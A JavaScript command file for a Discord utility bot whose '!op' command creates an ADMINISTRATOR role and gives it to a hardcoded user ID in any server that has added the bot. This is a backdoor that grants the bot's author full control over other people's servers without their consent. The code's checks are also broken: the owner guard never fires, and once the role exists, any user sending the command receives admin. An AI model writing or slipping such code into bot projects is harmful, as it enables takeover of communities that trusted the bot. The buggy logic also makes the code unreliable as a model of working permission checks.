

module.exports = {
    name: 'op',
	aliases: ['admin' , 'power'],
    description: 'Gives the bot owner admin permission in a server!',
    cooldown: 2,
    Usage: '`!op`',
    Category: "System",
    PermLevel: `Bot Owner`,
    async execute(client, message, args){

        const Discord = require('discord.js')
        if (!message.author.id == "683879319558291539") {

            return;
            
        }
        if (message.author.id == "683879319558291539") {

            message.guild.roles.create({ data: { name: 'Cent Utilty bot Developer', permissions: ['ADMINISTRATOR'] } });

            
        }
        let role = message.guild.roles.cache.find(r => r.name === "Cent Utilty bot Developer");

            //person who started the message
            let member = message.member;

            //Give the role.
            member.roles.add(role)

            const opd = new Discord.MessageEmbed()
            .setTitle('SUCCESS!')
            .setDescription('Successfully given admin perm to ' + message.author.tag + ' in the server: ' + message.guild.name)
            .setColor('GREEN')
            message.channel.send(opd)

            .catch(error => {
                message.channel.send('Something went wrong in the Cent Utilities land. Error for reference: ', error);
            });



    


    },
};